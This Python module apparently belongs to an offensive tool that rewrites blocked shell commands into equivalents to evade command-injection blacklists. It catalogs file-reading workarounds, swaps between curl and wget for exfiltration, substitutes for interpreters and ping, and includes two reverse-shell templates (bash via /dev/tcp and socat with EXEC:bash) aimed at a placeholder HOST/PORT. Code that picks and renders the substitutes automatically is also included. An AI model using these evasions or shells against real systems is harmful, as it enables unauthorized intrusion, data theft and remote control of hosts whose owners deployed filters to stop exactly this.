"""
Substitute commands when a binary name is blacklisted.

Sources: PayloadsAllTheThings (Command Injection), Commix, GTFOBins-style
read/list patterns, HackTricks command injection cheat sheets.
"""

from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field

from cantstopme.engine.blacklist import Blacklist
@dataclass(frozen=True)
class CommandAlternative:
    id: str
    replaces: str
    template: str
    priority: int = 50
    contexts: tuple[str, ...] = ("general", "bash", "sh")
    requires_not_blocked: tuple[str, ...] = ()
    args_regex: str | None = None
    note: str = ""
    references: tuple[str, ...] = field(default_factory=tuple)

    def applies(
        self,
        bl: Blacklist,
        *,
        args: str,
    ) -> bool:
        for ch in self.requires_not_blocked:
            if bl.blocks_char(ch):
                return False
            if ch == "space" and bl.blocks_space():
                return False
        if self.args_regex and not re.search(self.args_regex, args):
            return False
        return True

    def render(self, args: str) -> str:
        path = _first_path_arg(args)
        return (
            self.template.replace("{path}", path)
            .replace("{args}", args.strip())
            .replace("{args_quoted}", shlex.quote(path) if path else "")
        )


def _first_path_arg(args: str) -> str:
    if not args.strip():
        return ""
    try:
        parts = shlex.split(args, posix=True)
    except ValueError:
        parts = args.split()
    for p in parts:
        if not p.startswith("-"):
            return p
    return parts[-1] if parts else ""


def _parse_command(command: str) -> tuple[str, str]:
    command = command.strip()
    if not command:
        return "", ""
    try:
        parts = shlex.split(command, posix=True)
    except ValueError:
        parts = command.split()
    if not parts:
        return "", ""
    return parts[0].lower(), " ".join(parts[1:])


# Lower priority number = tried first for primary output
CATALOG: tuple[CommandAlternative, ...] = (
    # --- ls (PAT brace / echo *; find) ---
    CommandAlternative(
        id="ls_echo_star",
        replaces="ls",
        template="echo *",
        priority=10,
        contexts=("general", "bash", "sh", "web_cmd_inject"),
        note="List cwd — no -la; good when only ls is blocked",
        references=("PAT: {cat,/etc/passwd} style listing",),
    ),
    CommandAlternative(
        id="ls_printf",
        replaces="ls",
        template="printf '%s\\n' *",
        priority=11,
        contexts=("bash", "sh"),
        requires_not_blocked=("%", "'"),
        note="One entry per line",
    ),
    CommandAlternative(
        id="ls_find",
        replaces="ls",
        template="find . -maxdepth 1",
        priority=20,
        contexts=("general", "bash", "sh"),
        note="Directory listing via find",
        references=("GTFOBins: find",),
    ),
    CommandAlternative(
        id="ls_find_la",
        replaces="ls",
        template="find . -maxdepth 1 -ls",
        priority=21,
        args_regex=r"-l",
        contexts=("bash", "sh"),
        note="Rough equivalent of ls -l",
    ),
    CommandAlternative(
        id="ls_dir",
        replaces="ls",
        template="dir",
        priority=25,
        contexts=("general",),
        note="If dir exists on PATH (some images)",
    ),
    # --- cat / read file ---
    CommandAlternative(
        id="cat_tac",
        replaces="cat",
        template="tac {path} | tac",
        priority=10,
        contexts=("general", "bash", "sh"),
        requires_not_blocked=("|",),
        note="Double tac reads forward",
        references=("GTFOBins: tac",),
    ),
    CommandAlternative(
        id="cat_head",
        replaces="cat",
        template="head -n 99999 {path}",
        priority=11,
        contexts=("general", "bash", "sh"),
        note="Read via head",
        references=("GTFOBins: head",),
    ),
    CommandAlternative(
        id="cat_tail",
        replaces="cat",
        template="tail -c +1 {path}",
        priority=12,
        contexts=("general", "bash", "sh"),
        note="Read from byte 1",
        references=("GTFOBins: tail",),
    ),
    CommandAlternative(
        id="cat_sed",
        replaces="cat",
        template="sed '' {path}",
        priority=13,
        contexts=("general", "bash", "sh"),
        note="sed print file",
        references=("GTFOBins: sed",),
    ),
    CommandAlternative(
        id="cat_awk",
        replaces="cat",
        template="awk 1 {path}",
        priority=14,
        contexts=("general", "bash", "sh"),
        note="awk print all lines",
    ),
    CommandAlternative(
        id="cat_grep",
        replaces="cat",
        template="grep . {path}",
        priority=15,
        contexts=("general", "bash", "sh"),
        requires_not_blocked=("."),
        note="grep any line",
        references=("GTFOBins: grep",),
    ),
    CommandAlternative(
        id="cat_more",
        replaces="cat",
        template="more {path}",
        priority=16,
        contexts=("general", "bash", "sh"),
        note="Pager (may pause)",
    ),
    CommandAlternative(
        id="cat_nl",
        replaces="cat",
        template="nl {path}",
        priority=17,
        contexts=("general", "bash", "sh"),
        note="Number lines — still dumps content",
    ),
    CommandAlternative(
        id="cat_dd",
        replaces="cat",
        template="dd if={path} bs=1",
        priority=18,
        contexts=("bash", "sh"),
        requires_not_blocked=("="),
        note="Raw read",
        references=("GTFOBins: dd",),
    ),
    CommandAlternative(
        id="cat_base64",
        replaces="cat",
        template="base64 {path} | base64 -d",
        priority=19,
        contexts=("general", "bash", "sh"),
        requires_not_blocked=("|",),
        note="Encode/decode round-trip",
    ),
    CommandAlternative(
        id="cat_rev",
        replaces="cat",
        template="rev {path} | rev",
        priority=20,
        contexts=("general", "bash", "sh"),
        requires_not_blocked=("|",),
        note="Reverse twice",
    ),
    CommandAlternative(
        id="cat_python3",
        replaces="cat",
        template="python3 -c \"print(open('{path}').read())\"",
        priority=30,
        contexts=("bash", "sh"),
        requires_not_blocked=("(", ")", "'", '"'),
        note="Python read — needs python3 on target",
    ),
    # --- whoami / id ---
    CommandAlternative(
        id="whoami_id",
        replaces="whoami",
        template="id -un",
        priority=10,
        contexts=("general", "bash", "sh"),
        note="Username via id",
    ),
    CommandAlternative(
        id="whoami_echo_user",
        replaces="whoami",
        template="echo $USER",
        priority=11,
        contexts=("bash", "sh", "zsh"),
        requires_not_blocked=("$"),
        note="Shell variable",
    ),
    CommandAlternative(
        id="id_whoami",
        replaces="id",
        template="whoami; id",
        priority=10,
        contexts=("general", "bash", "sh"),
        requires_not_blocked=(";"),
        note="Fallback chain",
    ),
    CommandAlternative(
        id="id_echo_uid",
        replaces="id",
        template="echo $UID",
        priority=11,
        contexts=("bash", "sh"),
        requires_not_blocked=("$"),
    ),
    # --- curl / wget (exfil) ---
    CommandAlternative(
        id="curl_wget",
        replaces="curl",
        template="wget {args}",
        priority=10,
        contexts=("general", "bash", "sh", "web_cmd_inject"),
        note="Swap HTTP client",
    ),
    CommandAlternative(
        id="wget_curl",
        replaces="wget",
        template="curl {args}",
        priority=10,
        contexts=("general", "bash", "sh", "web_cmd_inject"),
    ),
    # --- nc ---
    CommandAlternative(
        id="nc_bash_devtcp",
        replaces="nc",
        template="bash -c 'exec bash -i &>/dev/tcp/HOST/PORT <&1'",
        priority=50,
        contexts=("bash",),
        requires_not_blocked=("<", ">", "&"),
        note="Replace HOST/PORT manually",
        references=("HackTricks: /dev/tcp",),
    ),
    CommandAlternative(
        id="nc_socat",
        replaces="nc",
        template="socat TCP:HOST:PORT EXEC:bash",
        priority=15,
        contexts=("general", "bash"),
        note="Replace HOST/PORT",
        references=("HackTricks: socat reverse shell",),
    ),
    # --- more read paths (GTFOBins) ---
    CommandAlternative(
        id="cat_strings",
        replaces="cat",
        template="strings {path}",
        priority=22,
        contexts=("general", "bash", "sh"),
        note="Binary-safe dump; layout differs from cat",
        references=("GTFOBins: strings",),
    ),
    CommandAlternative(
        id="cat_xxd",
        replaces="cat",
        template="xxd -p {path} | xxd -r -p",
        priority=23,
        contexts=("bash", "sh"),
        requires_not_blocked=("|",),
        references=("PAT: xxd hex path",),
    ),
    CommandAlternative(
        id="cat_while_read",
        replaces="cat",
        template="while read l;do echo $l;done<{path}",
        priority=24,
        contexts=("bash", "sh"),
        requires_not_blocked=("<", "$"),
        references=("HackTricks: read loop",),
    ),
    CommandAlternative(
        id="cat_od",
        replaces="cat",
        template="od -An -c {path}",
        priority=26,
        contexts=("general", "bash", "sh"),
        note="Octal dump — human readable with effort",
    ),
    # --- grep / find ---
    CommandAlternative(
        id="grep_sed",
        replaces="grep",
        template="sed -n '{args}p'",
        priority=15,
        contexts=("bash", "sh"),
        note="Rough grep via sed -n (adjust pattern)",
    ),
    CommandAlternative(
        id="find_ls",
        replaces="find",
        template="ls {args}",
        priority=40,
        contexts=("general",),
        note="Only if ls not also blocked",
    ),
    # --- interpreters ---
    CommandAlternative(
        id="python3_perl",
        replaces="python3",
        template="perl -e '{args}'",
        priority=20,
        contexts=("bash", "sh"),
        requires_not_blocked=("'", '"'),
        note="Adjust -e one-liner manually",
    ),
    CommandAlternative(
        id="perl_python3",
        replaces="perl",
        template='python3 -c "{args}"',
        priority=20,
        contexts=("bash", "sh"),
    ),
    CommandAlternative(
        id="bash_busybox",
        replaces="bash",
        template="busybox sh -c '{args}'",
        priority=15,
        contexts=("general", "bash", "sh"),
        references=("GTFOBins: busybox",),
    ),
    # --- ping / sleep (blind) ---
    CommandAlternative(
        id="ping_sleep",
        replaces="ping",
        template="sleep 5",
        priority=30,
        contexts=("blind_time", "general", "bash"),
        note="Time blind when ping filtered",
        references=("PAT: time-based exfil",),
    ),
)

_BY_ID = {a.id: a for a in CATALOG}


def catalog_by_id(alt_id: str) -> CommandAlternative | None:
    return _BY_ID.get(alt_id)


def applicable_substitutes(
    command: str,
    bl: Blacklist,
) -> list[CommandAlternative]:
    base, args = _parse_command(command)
    if not base or not bl.blocks_keyword(base):
        return []
    out: list[CommandAlternative] = []
    for alt in CATALOG:
        if alt.replaces != base:
            continue
        if not alt.applies(bl, args=args):
            continue
        if not args.strip() and "{path}" in alt.template:
            continue
        out.append(alt)
    out.sort(key=lambda a: a.priority)
    return out


def apply_substitute(
    command: str,
    bl: Blacklist,
    *,
    alt_id: str | None = None,
) -> tuple[str, CommandAlternative | None, list[str]]:
    """Return (new_command, chosen_alternative, hints)."""
    base, args = _parse_command(command)
    if not base or not bl.blocks_keyword(base):
        return command, None, []

    if alt_id:
        alt = catalog_by_id(alt_id)
        if not alt or alt.replaces != base:
            return command, None, [f"Unknown substitute id: {alt_id}"]
        if not alt.applies(bl, args=args):
            return command, None, [f"Substitute {alt_id} not applicable"]
        rendered = alt.render(args)
        hints = [f"Replace {base} -> {alt.id}: {alt.note}"] if alt.note else []
        return rendered, alt, hints

    alts = applicable_substitutes(command, bl)
    if not alts:
        return command, None, [f"No substitute for '{base}' in catalog"]
    alt = alts[0]
    return alt.render(args), alt, [f"Replace {base} -> {alt.id}: {alt.note}"]
